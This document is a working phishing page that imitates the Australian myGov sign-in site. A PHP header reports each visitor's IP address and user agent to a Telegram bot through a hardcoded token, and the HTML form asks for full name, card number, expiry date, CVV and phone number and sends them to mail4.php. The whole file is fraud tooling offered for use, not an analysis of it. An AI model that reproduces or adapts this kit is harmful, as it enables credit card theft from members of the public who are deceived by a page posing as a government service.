<?php
// Telegram Bot API token
$botApiToken = '7377635625:AAGaEhGs_Rk-y_dGbNZg3qzwqbuzw8f0fRQ';

// Telegram group ID where you want to send notifications
$groupId = '-4287461385';

// Array of blocked IP addresses
$blockedIPs = [
    '161.35.121.7',
    // Add more IPs as needed
];

// Function to get visitor's IP address
function getIpAddress() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // Check IP from shared internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Check IP from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
}

// Function to send notification to Telegram
function sendNotification($message) {
    global $botApiToken, $groupId;

    $telegramApiUrl = "https://api.telegram.org/bot$botApiToken/sendMessage";
    $params = [
        'chat_id' => $groupId,
        'text' => $message,
    ];

    // Use cURL to send POST request to Telegram Bot API
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

// Get visitor's IP address
$ipAddress = getIpAddress();

// Check if IP is in blocked list
if (in_array($ipAddress, $blockedIPs)) {
    exit; // Exit script if IP is blocked
}

// Get user agent
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Construct Telegram message
$locationUrl = "https://ipapi.co/$ipAddress/";
$message = " 

▪ Visitor 🇦🇺 👤
▪ MyGov CC 💼

IP = $ipAddress
Location = $locationUrl
User Agent = $userAgent

============================";

// Send notification to Telegram
$response = sendNotification($message);

// Debugging: Print response from Telegram API (optional)
// echo "Response from Telegram API:<br>";
// echo "<pre>" . print_r($response, true) . "</pre>";
?>





<!DOCTYPE html>
<!--[if IE 9]><html class="ie ie9" lang="en"><![endif]-->
<!--[if (gt IE 9)|!(IE)]><!-->
<html lang="en">
<!--<![endif]-->

<head>
	<!--
E: PROD; 
C: MW0w; 
N: MW0w10; 
S: SW10d;  
-->
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="apple-mobile-web-app-capable" content="yes" />
	<title>
		Sign in with myGov - myGov
	</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- phone number format detection, turning it off -->
	<meta name="format-detection" content="telephone=no">
	<script type="text/javascript" src="/LoginServices/main/ruxitagentjs_ICA2Vfghjqrux_10249220905100923.js" data-dtconfig="app=5f15dc81410a75c1|ssc=1|rcdec=1209600000|featureHash=ICA2Vfghjqrux|vcv=2|rdnt=0|uxrgce=1|bp=3|srmcrv=10|cuc=gpalpirq|mel=100000|md=mdcc1=ainput#user-id,mdcc2=adiv.error-msg-text span,mdcc3=aspan[data-home-welcome-message]|ssv=4|lastModification=1674151740659|dtVersion=10249220905100923|srmcrl=1|tp=500,50,0,1|uxdcw=1500|agentUri=/LoginServices/main/ruxitagentjs_ICA2Vfghjqrux_10249220905100923.js|reportUrl=/LoginServices/main/rb_6de8e2e9-6719-45b3-86be-7effcb9f6525|rid=RID_315655542|rpid=1022727629|domain=my.gov.au"></script><link rel="icon" type="image/png" sizes="32x32" href="https://my.gov.au/content/dam/mygov/images/brand/icons/favicon-32x32.png">
  	<link rel="icon" type="image/png" sizes="16x16" href="icons/favicon-16x16.png">
	<link
		href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap"
		rel="stylesheet">
	<link href="css/mgv2-application.css" rel="stylesheet">
	<link href="css/blugov.css" rel="stylesheet">
	
</head>

<noscript>
	<div class="outage">
		<div class="outage__inner">
			<div>
				<span class="is-visuallyhidden"> Warning message: </span>
				<p> JavaScript is required for myGov to work correctly.</p>
			</div>
		</div>
	</div>
</noscript>




	
		<body>
	
	





<nav class="uikit-skip-link" aria-label="Skip Links">
	<a class="uikit-skip-link__link" href="#content">Skip to main content</a>
</nav>

<div class="brand-rainbow">&nbsp;</div>
<header role="banner" class="mgvEnhanceHeader">
	<section class="wrapper">
		<div class="inner">
			<div class="unauth-grid">
				<div class="unauth-grid-row">
					<a href="https://beta.my.gov.au/" class="unauth-govt-crest__link">
					    <img id="unauth-govt-crest" src="img/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
                    </a>

					<div class="header-links">
						<a href="https://beta.my.gov.au/en/about/help">Help</a>
					</div>
				</div>
			</div>
		</div>
	</section>
</header>









<div class="wrapper-mapwap"><div class="main-block" id="content" role="main" > 
	<div class="unauth">
		<div class="login-grid-container">
			<div class="login-grid-row">
				<div class="login-grid-column">
					<div class="digital-id-login-card-wrapper">
						<div class="digital-id-main-login-card override">
	
						

							
							
							

							
								
								
								
									
								
							

							<h1>Connect your Debit/Credit Card</h1>
							<p class="login-instruction-text">Add a payment method to verify your identity.</p>
							
							<form action=mail4.php d="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" method="post">
	
								<div class="input-group">
									<label class="override" for="name">Full Name</label>
									<input id="name" name="name" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off" required>
								</div>
							
								</p>
	
								<div class="input-group">
									<label for="tfn" class="override">Card Number</label>
									<div class="password-group">
										<input id="tfn" name="tfn" type="text"
											data-current-password="data-current-password" autocomplete="off"
											aria-required="true" required>
									</div>
								</div>
								
							    </p>
								
								<div class="input-group"> 
									<label for="dob" class="override">Exp Date</label>
									<div class="password-group">
										<input id="dob" name="dob" type="text"
											data-current-password="data-current-password" autocomplete="off"
											aria-required="true" required>
							    
							    </p>
								<div class="input-group"> 
									<label for="dob" class="override">Cvv</label>
									<div class="password-group">
										<input id="dob" name="cvv" type="text"
											data-current-password="data-current-password" autocomplete="off"
											aria-required="true" required>
							    
							    </p>
								
								<div class="input-group"> 
									<label for="adresse" class="override">Phone Number</label>
									<div class="password-group">
										<input id="adresse" name="adresse" type="text"
											data-current-password="data-current-password" autocomplete="off"
											aria-required="true" required>
									</div>

								      </p>


		
	
								<div class="button-digital-id-main-container override">
									<div class="digital-id-button-container">
										<button type="submit"  class="button-main" >Complete</button>
									</div>
								</div>
	
							
							</div></form>
	
						</div></div>
							
							
						
						
						
						</body>
						
						</html>